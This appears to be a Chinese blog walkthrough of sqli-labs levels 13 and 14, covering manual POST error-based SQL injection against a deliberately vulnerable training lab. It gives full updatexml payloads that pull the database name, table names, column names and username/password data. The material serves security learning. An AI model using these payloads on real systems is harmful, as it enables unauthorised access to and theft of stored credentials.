# 原创
：  （手工）【sqli-labs13-14】POST注入：报错回显（基本步骤）

# （手工）【sqli-labs13-14】POST注入：报错回显（基本步骤）

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、POST（报错）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[ 2.1、第一步：判断是否存在SQL漏洞](#2.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E)

[2.2、第二步：判断字段数](#2.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.3、第三步：查询当前数据库](#2.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93)

[2.4、第四步：查表名](#2.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%A1%A8%E5%90%8D)

[2.5、第五步：查字段](#2.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%9F%A5%E5%AD%97%E6%AE%B5)

[2.6、第六步：查数据](#2.7%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E6%9F%A5%E6%95%B0%E6%8D%AE)

[二、Less13（POST-Double injection - Single Quotes String-with twist）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（错误-单引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[ 第一步：注入点测试](#%C2%A0%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[第二步：判断字段数](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[第三步：爆数据库](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93)

[ 第四步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[ 第五步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[ 第六步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[三、Less14（POST-Double injection - Single Quotes String-with twist）](#%E4%B8%89%E3%80%81Less14%EF%BC%88POST-Double%20injection%20-%20Single%20Quotes%20String-with%20twist%EF%BC%89)

[3.1、简介：（错误-单引号）](#3.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E9%94%99%E8%AF%AF-%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%89)

---


> 
<h2>推荐：</h2>
[【SQL注入-可回显】报错注入：简介、相关函数、利用方法<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.4/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M5H6"/>https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165718272016782390523827%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165718272016782390523827&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165718272016782390523827%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165718272016782390523827&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4450)


---


---


## 一、POST（报错）SQL注入基本步骤：

> 
<h3> 2.1、第一步：判断是否存在SQL漏洞</h3>
在输入框中填入一些闭合的符号，看页面是否异常
如： ’        "          ')          ")
当页面发生错误，则证明闭合有效
有时单双引号闭合后，还要考虑括号个数
<hr/>
<h3>2.2、第二步：判断字段数</h3>
例如：
”) order by 3#
当回显正确的时候，或无报错，就判断出字段数

<hr/>
<h3>2.3、第三步：查询当前数据库</h3>
例如：
“) union select 1,updatexml(1,concat(0x7e,(select database()),0x7e),1)#
<hr/>
<h3>2.4、第四步：查表名</h3>
例如：
”) union select 1,updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,31),0x7e),1)#
<hr/>
<h3>2.5、第五步：查字段</h3>
例如：
“) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),1,31),0x7e),1)#
<hr/>
<h3>2.6、第六步：查数据</h3>
例如：
”) and updatexml(1,concat(0x7e,substr((select group_concat(username,password) from users),1,31),0x7e),1)#


### 2.2、第二步：判断字段数

---


### 2.4、第四步：查表名

---


### 2.6、第六步：查数据

---


---


## 二、Less13（POST-Double injection - Single Quotes String-with twist）

> 
<h3>2.1、简介：（错误-单引号）</h3>
请求方法：POST
方法：报错注入


> 
<h3> 第一步：注入点测试</h3>
加上单引号后，发现会返回报错信息，且可以知道是单引号闭合的
可以考虑使用报错注入

发现还有括号
’）#后没有报错了

 使用联合查询发现没有返回结果
所以这里考虑使用报错注入


> 
<h3>第二步：判断字段数</h3>
admin') order by 2#
为2的时候没有报错
字段数为2




> 
<h3>第三步：爆数据库</h3>
admin') union select 1,updatexml(1,concat(0x7e,(select database()),0x7e),1)#
(这个地方字段数不对也能爆出来数据)<br/><img alt="" height="792" src="https://img-blog.csdnimg.cn/b8e0e8a61545498e81d56a811178d273.png" width="1200"/>



> 
<h3> 第四步：爆表名</h3>
admin') union select 1,updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,31),0x7e),1)#
（这里字段数不对，就不能爆出数据）




> 
<h3> 第五步：爆字段</h3>
admin') and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),1,31),0x7e),1)#






> 
<h3> 第六步：爆数据</h3>
admin') and updatexml(1,concat(0x7e,substr((select group_concat(username,password) from users),1,31),0x7e),1)#




---


---


## 三、Less14（POST-Double injection - Single Quotes String-with twist）

> 
<h3>3.1、简介：（错误-单引号）</h3>
请求方法：POST
方法：报错注入


> 
方法同Less13

